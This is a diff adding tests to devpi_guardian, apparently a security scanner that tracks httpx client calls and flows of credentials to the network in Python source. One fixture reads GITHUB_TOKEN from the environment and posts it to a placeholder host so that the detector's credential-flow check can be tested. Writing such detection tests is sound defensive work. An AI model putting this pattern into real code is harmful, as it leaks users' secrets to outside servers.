@@ -8,6 +8,7 @@ import devpi_guardian.analyzers.astutil as astutil_module
 from devpi_guardian.analyzers.astutil import (
     AnalysisLimitExceeded,
     build_alias_table,
+    find_credential_network_flows,
     parse_python,
     scan_calls,
     top_level_calls,
@@ -114,6 +115,214 @@ persistent_client.get("https://example.test")
     ]
 
 
+def test_client_attribute_binding_tracks_reported_instance_case() -> None:
+    source = """
+import httpx
+
+class Api:
+    def __init__(self):
+        self.client = httpx.Client()
+
+    def fetch(self):
+        return self.client.get("https://example.test")
+"""
+    calls, _ = scan_calls(ast.parse(source), source)
+    assert [(call.qualified_name, call.line) for call in calls if call.category == "network"] == [
+        ("httpx.Client.get", 9)
+    ]
+
+
+def test_client_attribute_tracking_supports_async_and_nested_paths() -> None:
+    source = """
+import httpx
+
+class Api:
+    async def __init__(self):
+        self.transport.client = httpx.AsyncClient()
+
+    async def fetch(self):
+        return await self.transport.client.get("https://example.test")
+"""
+    calls, _ = scan_calls(ast.parse(source), source)
+    assert [(call.qualified_name, call.line) for call in calls if call.category == "network"] == [
+        ("httpx.AsyncClient.get", 9)
+    ]
+
+
+def test_client_attribute_class_seed_is_order_independent_and_receiver_names_differ() -> None:
+    source = """
+import httpx
+
+class Api:
+    def fetch(self):
+        return self.client.get("https://example.test")
+
+    def __init__(api):
+        api.client = httpx.Client()
+"""
+    calls, _ = scan_calls(ast.parse(source), source)
+    assert [(call.qualified_name, call.line) for call in calls if call.category == "network"] == [
+        ("httpx.Client.get", 6)
+    ]
+
+
+def test_client_attribute_same_method_unknown_reassignment_invalidates() -> None:
+    source = """
+import httpx
+
+class Api:
+    def fetch(self):
+        self.client = httpx.Client()
+        self.client.get("https://one.example")
+        self.client = FakeClient()
+        self.client.get("not-network")
+"""
+    calls, _ = scan_calls(ast.parse(source), source)
+    assert [(call.qualified_name, call.line) for call in calls if call.category == "network"] == [
+        ("httpx.Client.get", 7)
+    ]
+
+
+def test_client_attribute_cross_method_unknown_or_conflicting_assignment_suppresses_seed() -> None:
+    source = """
+import httpx
+
+class Unknown:
+    def __init__(self):
+        self.client = httpx.Client()
+
+    def reset(self):
+        self.client = FakeClient()
+
+    def fetch(self):
+        return self.client.get("not-network")
+
+class Conflicting:
+    def __init__(self):
+        self.client = httpx.Client()
+
+    def reset(self):
+        self.client = httpx.AsyncClient()
+
+    def fetch(self):
+        return self.client.get("not-network")
+"""
+    calls, _ = scan_calls(ast.parse(source), source)
+    assert [call for call in calls if call.category == "network"] == []
+
+
+def test_client_attribute_parent_reassignment_invalidates_nested_path() -> None:
+    source = """
+import httpx
+
+class Api:
+    def __init__(self):
+        self.transport.client = httpx.Client()
+
+    def reset(self):
+        self.transport = {}
+
+    def fetch(self):
+        return self.transport.client.get("not-network")
+"""
+    calls, _ = scan_calls(ast.parse(source), source)
+    assert [call for call in calls if call.category == "network"] == []
+
+
+def test_client_attribute_comprehension_target_invalidates_receiver_path() -> None:
+    source = """
+import httpx
+
+class Api:
+    def __init__(self):
+        self.client = httpx.Client()
+
+    def reset(self, values):
+        [self.client for self.client in values]
+
+    def fetch(self):
+        return self.client.get("not-network")
+"""
+    calls, _ = scan_calls(ast.parse(source), source)
+    assert [call for call in calls if call.category == "network"] == []
+
+
+def test_client_attribute_class_summaries_are_isolated_and_static_class_methods_do_not_seed() -> (
+    None
+):
+    source = """
+import httpx
+
+class Known:
+    def __init__(self):
+        self.client = httpx.Client()
+
+    def fetch(self):
+        return self.client.get("https://example.test")
+
+class Other:
+    def fetch(self):
+        return self.client.get("not-network")
+
+class Isolated:
+    @staticmethod
+    def initialize(value):
+        value.client = httpx.Client()
+
+    @classmethod
+    def fetch(cls):
+        return cls.client.get("not-network")
+"""
+    calls, _ = scan_calls(ast.parse(source), source)
+    assert [(call.qualified_name, call.line) for call in calls if call.category == "network"] == [
+        ("httpx.Client.get", 9)
+    ]
+
+
+def test_client_attribute_alias_copy_and_unrelated_get_values_are_precise() -> None:
+    source = """
+import httpx
+
+client = httpx.Client()
+
+class Api:
+    def __init__(self):
+        self.client = client
+        self.other = self.client
+
+    def fetch(self):
+        values = {}
+        httpx.URL("https://example.test")
+        httpx.Response(200)
+        FakeClient().get("not-network")
+        values.get("not-network")
+        self.client.get("https://example.test")
+        self.other.post("https://example.test")
+"""
+    calls, _ = scan_calls(ast.parse(source), source)
+    assert [(call.qualified_name, call.line) for call in calls if call.category == "network"] == [
+        ("httpx.Client.get", 17),
+        ("httpx.Client.post", 18),
+    ]
+
+
+def test_credential_flow_tracks_self_client_post_sink() -> None:
+    source = """
+import httpx
+import os
+
+class Api:
+    def send(self):
+        self.client = httpx.Client()
+        token = os.getenv("GITHUB_TOKEN")
+        self.client.post("https://example.test", data=token)
+"""
+    flows = find_credential_network_flows(ast.parse(source), source)
+    assert [(flow.source.description, flow.sink.qualified_name) for flow in flows] == [
+        ("os.getenv('GITHUB_TOKEN')", "httpx.Client.post")
+    ]
+
+
 def test_connection_and_opener_instance_io_is_precise() -> None:
     source = """
 import http.client as client_http
@@ -185,6 +394,37 @@ def unrelated(client):
     assert [(call.qualified_name, call.line) for call in calls if call.category == "network"] == [
         ("httpx.Client.get", 5)
     ]
+
+
+def test_module_binding_visibility_keeps_source_order() -> None:
+    source = """
+import httpx
+
+client = {}
+def send():
+    client.get("not-network")
+client = httpx.Client()
+"""
+    calls, _ = scan_calls(ast.parse(source), source)
+    assert [call for call in calls if call.category == "network"] == []
+
+
+def test_module_binding_deletion_is_not_carried_into_class_summaries() -> None:
+    source = """
+import httpx
+
+client = httpx.Client()
+del client
+
+class Api:
+    def __init__(self):
+        self.client = client
+
+    def fetch(self):
+        return self.client.get("not-network")
+"""
+    calls, _ = scan_calls(ast.parse(source), source)
+    assert [call for call in calls if call.category == "network"] == []
 
 
 def test_nested_lambda_parameter_shadows_outer_client_but_capture_remains_network() -> None:
